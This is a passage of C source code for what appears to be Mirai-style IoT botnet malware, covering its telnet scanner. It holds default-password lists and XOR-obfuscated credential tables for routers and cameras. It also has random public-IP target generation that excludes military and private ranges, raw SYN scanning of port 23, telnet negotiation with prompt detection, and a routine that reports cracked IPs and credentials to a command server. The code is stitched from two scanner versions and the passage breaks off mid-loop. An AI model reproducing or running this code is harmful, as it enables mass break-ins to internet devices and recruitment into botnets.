    "1111\0",
    "54321\0",
    "antslq\0",
    "zte9x15\0",
    "system\0",
    "1456\0",
    "888888\0",
    "ikwb\0",
    "default\0",
    "juantech\0",
    "xc3511\0",
    "support\0",
    "1111111\0",
    "service\0",
    "145\0",
    "4321\0",
    "tech\0",
    "<>\0",
    "abc1\0",
    "7ujMko0admin\0",
    "switch\0",
    "admin14\0",
    "\0",
    "1111\0",
    "meinsm\0",
    "pass\0",
    "smcadmin\0",
    "14567890\0",
    "14\0",
    "admin1\0",
    "password\0",
    "admin\0",
    "anko\0",
    "xc3511\0",
    "1456\0",
    "\0",
    "guest\0",
    "145\0",
    "xc3511\0",
    "admin\0",
    "Zte521\0",
    "\0",
    "user\0",
    "guest\0",
    "\0",
    "password\0",
    "admin1\0",
    "ikwb\0",
    "14567890\0",
    "\0",
    "\0",
    "1456\0",
    "root\0",
    "telnet\0",
    "zte9x15\0",
    "meinsm\0",
    "\0",
    "\0",
    "antslq\0",
    "merlin\0",
    "switch\0",
    "7ujMko0admin\0",
    "abc1\0",
    "<>\0",
    "tech\0",
    "4321\0",
    "default\0",
    "145\0",
    "service\0",
    "1111111\0",
    "admin14\0",
    "pass\0",
    "user\0",
    "hi3518\0",
    "password\0",
    "ubnt\0",
    "zlxx.\0",
    "14567\0",
    "000000\0"
};


char * advances[] = {
    ":",
    "ser",
    "ogin",
    "name",
    "pass",
    "dvrdvs",
    (char * ) 0
};
char * fails[] = {
    "nvalid",
    "ailed",
    "ncorrect",
    "enied",
    "error",
    "goodbye",
    "bad",
    "timeout",
    (char * ) 0
};
char * successes[] = {
    "$",
    "#",
    ">",
    "@",
    "shell",
    "dvrdvs",
    "usybox",
    (char * ) 0
};
char * advances2[] = {
    "nvalid",
    "ailed",
    "ncorrect",
    "enied",
    "rror",
    "oodbye",
    "bad",
    "busybox",
    "$",
    "#",
    (char * ) 0
};
char * legit[] = {
    "Ak47",
    (char * ) 0
};


void makeRandomStr(unsigned char * buf, int length) {
    int i = 0;
    for (i = 0; i < length; i++) buf[i] = (rand_cmwc() % (91 - 65)) + 65;
}


struct telstate_t {
    int fd;
    unsigned int ip;
	unsigned int port;
    unsigned char state;
    unsigned char complete;
    unsigned char usernameInd;
    unsigned char passwordInd;
    unsigned char tempDirInd;
    unsigned int totalTimeout;
    unsigned short bufUsed;
    char * sockbuf;
};
const char * get_telstate_host(struct telstate_t * telstate) {
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = telstate -> ip;
    return inet_ntoa(in_addr_ip);
}

void advance_telstate(struct telstate_t * telstate, int new_state) { // advance
    if (new_state == 0) {
        close(telstate->fd);
    }
    telstate->totalTimeout = 0;
    telstate->state = new_state;
    memset((telstate->sockbuf), 0, SOCKBUF_SIZE);
}

int negotiate(int sock, unsigned char *buf, int len) {
    unsigned char c;
    switch (buf[1]) {
    case CMD_IAC:
        return 0;
    case CMD_WILL:
    case CMD_WONT:
    case CMD_DO:
    case CMD_DONT:
        c = CMD_IAC;
        send(sock,&c, 1, MSG_NOSIGNAL);
        if (CMD_WONT == buf[1]) c = CMD_DONT;
        else if (CMD_DONT == buf[1]) c = CMD_WONT;
        else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
        else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
        send(sock,&c, 1, MSG_NOSIGNAL);
        send(sock,&(buf[2]), 1, MSG_NOSIGNAL);
        break;
    default:
        break;
    }

    return 0;
}
const char *szk_wcsstri(const char *s1, const char *s2)
{
    if (s1 == NULL || s2 == NULL) return NULL;
    const char *cpws1 = s1, *cpws1_, *cpws2;
    char ch1, ch2;
    int bSame;

    while (*cpws1 != L'\0')
    {
        bSame = 1;
        if (*cpws1 != *s2)
        {
            ch1 = mytoupper(*cpws1);
            ch2 = mytoupper(*s2);

            if (ch1 == ch2)
                bSame = 1;
        }

        if (1 == bSame)
        {
            cpws1_ = cpws1;
            cpws2 = s2;
            while (*cpws1_ != L'\0')
            {
                ch1 = mytoupper(*cpws1_);
                ch2 = mytoupper(*cpws2);

                if (ch1 != ch2)
                    break;

                cpws2++;

                if (*cpws2 == L'\0')
                    return cpws1_-(cpws2 - s2 - 0x01);
                cpws1_++;
            }
        }
        cpws1++;
    }
    return NULL;
}
int contains_string(char *buffer, char ** strings) {
    int num_strings = 0, i = 0;
    for (num_strings = 0; strings[++num_strings] != 0;);
    for (i = 0; i < num_strings; i++) {
        if (szk_wcsstri(buffer, strings[i])) {
            return 1;
        }
    }
    return 0;
}

int read_with_timeout(int fd, int timeout_usec, char *buffer, int buf_size) {
    fd_set read_set;
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = timeout_usec;
    FD_ZERO(&read_set);
    FD_SET(fd,&read_set);
    if (select(fd + 1,&read_set, NULL, NULL,&tv) < 1)
        return 0;
    return recv(fd, buffer, buf_size, 0);
}

int read_until_response(int fd, int timeout_usec, char * buffer, int buf_size, char ** strings) {
    int num_bytes, i;
    memset(buffer, 0, buf_size);
    num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);

    if (buffer[0] == 0xFF) {
        negotiate(fd, buffer, 3);
    }

    if (contains_string(buffer, strings)) {
        return 1;
    }

    return 0;
}

void advance_state(struct telstate_t * telstate, int new_state) {
    if (new_state == 0) {
        close(telstate -> fd);
    }

    telstate -> totalTimeout = 0;
    telstate -> state = new_state;
    memset((telstate -> sockbuf), 0, SOCKBUF_SIZE);
}

void reset_telstate(struct telstate_t * telstate) {
    advance_state(telstate, 0);
    telstate -> complete = 1;
}
int contains_success(char * buffer) {
    return contains_string(buffer, successes);
}
int contains_fail(char * buffer) {
    return contains_string(buffer, fails);
}
int contains_response(char * buffer) {
    return contains_success(buffer) || contains_fail(buffer);
}


int matchPrompt(char * bufStr) {
    char * prompts = ":>%$#\0";

    int bufLen = strlen(bufStr);
    int i, q = 0;
    for (i = 0; i < strlen(prompts); i++) {
        while (bufLen > q && ( * (bufStr + bufLen - q) == 0x00 || * (bufStr + bufLen - q) == ' ' || * (bufStr + bufLen - q) == '\r' || * (bufStr + bufLen - q) == '\n')) q++;
        if ( * (bufStr + bufLen - q) == prompts[i]) return 1;
    }

    return 0;
}

int readUntil(int fd, char * toFind, int matchLePrompt, int timeout, int timeoutusec, char * buffer, int bufSize, int initialIndex) {
    int bufferUsed = initialIndex, got = 0, found = 0;
    fd_set myset;
    struct timeval tv;
    tv.tv_sec = timeout;
    tv.tv_usec = timeoutusec;
    unsigned char * initialRead = NULL;

    while (bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0)) {
        FD_ZERO( & myset);
        FD_SET(fd, & myset);
        if (select(fd + 1, & myset, NULL, NULL, & tv) < 1) break;
        initialRead = buffer + bufferUsed;
        got = recv(fd, initialRead, 1, 0);
        if (got == -1 || got == 0) return 0;
        bufferUsed += got;
        if ( * initialRead == 0xFF) {
            got = recv(fd, initialRead + 1, 2, 0);
            if (got == -1 || got == 0) return 0;
            bufferUsed += got;
            if (!negotiate(fd, initialRead, 3)) return 0;
        } else {
            if (strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) {
                found = 1;
                break;
            }
        }
    }

    if (found) return 1;
    return 0;
}
uint32_t getPIP() {
    uint8_t ipState[4] = {
        0
    };
    ipState[0] = rand() % 255;
    ipState[1] = rand() % 255;
    ipState[2] = rand() % 255;
    ipState[3] = rand() % 255;

    while (
        (ipState[0] == 0) ||
        (ipState[0] == 10) ||
        (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
        (ipState[0] == 127) ||
        (ipState[0] == 169 && ipState[1] == 254) ||
        (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
        (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
        (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
        (ipState[0] == 192 && ipState[1] == 168) ||
        (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
        (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
        (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
        (ipState[0] >= 224) && (ipState[0] <= 239) //Multicast ip ranges
    ) {
        ipState[0] = rand() % 255;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
    }

    return INET_ADDR(ipState[0], ipState[1], ipState[2], ipState[3]);
}
int random_number(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }

    result = (rand() % (hi_num - low_num)) + low_num;
    return result;
}

#ifdef DEBUG
#define SCANNER_MAX_CONNS   512
#define SCANNER_RAW_PPS     8912
#else
#define SCANNER_MAX_CONNS   512
#define SCANNER_RAW_PPS     8912
#endif

#define SCANNER_RDBUF_SIZE  256
#define SCANNER_HACK_DRAIN  64

struct j83j_auth {
    char *username;
    char *password;
    uint16_t weight_min, weight_max;
    uint8_t username_len, password_len;
};
typedef uint32_t ipv4_t;
struct j83j_connection {
    struct j83j_auth *auth;
    int fd, last_recv;
    enum {
        SC_CLOSED,
        SC_CONNECTING,
        SC_HANDLE_IACS,
        SC_WAITING_USERNAME,
        SC_WAITING_PASSWORD,
        SC_WAITING_PASSWD_RESP,
        SC_WAITING_ENABLE_RESP,
        SC_WAITING_SYSTEM_RESP,
        SC_WAITING_SHELL_RESP,
        SC_WAITING_SH_RESP,
        SC_WAITING_TOKEN_RESP
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[SCANNER_RDBUF_SIZE];
    uint8_t tries;
};

int j83j_pid, rsck, rsck_out, auth_table_len = 0;
char j83j_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct j83j_auth *auth_table = NULL;
struct j83j_connection *ctableu;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;

int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

ipv4_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof (addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[util] Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(1,1,1,1);
    addr.sin_port = HTONS(53);

    connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

static void setup_connection(struct j83j_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[j83j] Failed to call socket()\n");
#endif
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static uint32_t x, y, z, w;
void rand_xywz(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    w = x ^ y;
}

uint32_t rand_next(void) //period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                     // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                      // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                      // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||         // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                     // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                     // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||       // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||        // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                    // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}

static int can_consume(struct j83j_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}
static int consume_iacs(struct j83j_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_any_prompt(struct j83j_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_user_prompt(struct j83j_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct j83j_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static char *deobf(char *str, int *len)
{
    int i;
    char *cpy;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
        cpy[i] ^= 0xDE;
        cpy[i] ^= 0xAD;
        cpy[i] ^= 0xBE;
        cpy[i] ^= 0xEF;
    }

    return cpy;
}

static int consume_resp_prompt(struct j83j_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    tkn_resp = "ncorrect";
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, 8) != -1)
    {
        return -1;
    }

    tkn_resp = "Ak47";
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, 4);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct j83j_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}

static struct j83j_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);

    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }

    return NULL;
}

static void report_working(ipv4_t daddr, int dport, struct j83j_auth *auth, int sock)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;
    struct resolv_entries *entries = NULL;

    if (pid > 0 || pid == -1)
        return;

   union {
       uint32_t raw;
       uint8_t octet[4];
   } ip;
   ip.raw = daddr;
struct in_addr ip_addr;
    ip_addr.s_addr = daddr;
//    printf("The IP address is %s\n", inet_ntoa(ip_addr));    
int j83jSock;
    
	sockprintf(fd_cnc, "TELNET %s:%d %s:%s\n", inet_ntoa(ip_addr), dport, auth->username,auth->password);

#ifdef DEBUG
    printf("[report] Send j83j result to loader\n");
#endif
    _exit(0);
}


uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += HTONS(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

ipv4_t LOCAL_ADDR;

void j83j_xywz(int sock)
{
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    j83j_pid = fork();
    if (j83j_pid > 0 || j83j_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_xywz();
    fake_time = time(NULL);
    ctableu = calloc(SCANNER_MAX_CONNS, sizeof (struct j83j_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        ctableu[i].state = SC_CLOSED;
        ctableu[i].fd = -1;
    }

    // Set up raw socket j83jning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[j83j] Failed to initialize raw socket, cannot j83j\n");
#endif
        _exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("[j83j] Failed to set IP_HDRINCL, cannot j83j\n");
#endif
        close(rsck);
        _exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)j83j_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = HTONS(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = HTONS(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = 1;

    // Set up passwords
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456
    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);      // support  support
    add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              // root     (none)
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          // admin    password
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                              // root     root
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          // root     12345
    add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                              // user     user
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 3);                                          // admin    (none)
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                              // root     pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 3);      // admin    admin1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 3);                              // root     1111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 3);          // admin    smcadmin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 2);                          // admin    1111
    add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 2);                      // root     666666
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 2);              // root     password
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 2);                              // root     1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 1);                      // root     klv123
    add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 1); // Administrator admin
    add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 1);      // service  service
    add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", 1); // supervisor supervisor
    add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 1);                      // guest    guest
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x13", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);      // admin1   password
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 1); // administrator 1234
    add_auth_entry("\x14\x14\x14\x14\x14\x14", "\x14\x14\x14\x14\x14\x14", 1);              // 666666   666666
    add_auth_entry("\x1A\x1A\x1A\x1A\x1A\x1A", "\x1A\x1A\x1A\x1A\x1A\x1A", 1);              // 888888   888888
    add_auth_entry("\x57\x40\x4C\x56", "\x57\x40\x4C\x56", 1);                              // ubnt     ubnt
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11\x16", 1);                  // root     klv1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13", 1);                      // root     Zte521
    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 1);                      // root     hi3518
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 1);                          // root     jvbzd
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 4);                              // root     anko
    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C", 1);                          // root     zlxx.
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 1); // root     7ujMko0vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // root     7ujMko0admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 1);                      // root     system
    add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x49\x55\x40", 1);                              // root     ikwb
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 1);              // root     dreambox
    add_auth_entry("\x50\x4D\x4D\x56", "\x57\x51\x47\x50", 1);                              // root     user
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x47\x43\x4E\x56\x47\x49", 1);                  // root     realtek
    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 1);              // root     00000000
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 1);              // admin    1111111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 1);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 1);                      // admin    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 1);                      // admin    54321
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 1);                  // admin    123456
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // admin    7ujMko0admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x16\x11\x10\x13", 1);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                          // admin    pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
    add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech

#ifdef DEBUG
    printf("[j83j] Scanner process initialized. Scanning started.\n");
#endif
	int port_ = 23;
    // Main logic loop
    while (1)
    {
        fd_set fdset_rd, fdset_wr;
        struct j83j_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if (fake_time != last_spew)
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)j83j_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ip();
                iph->check = 0;
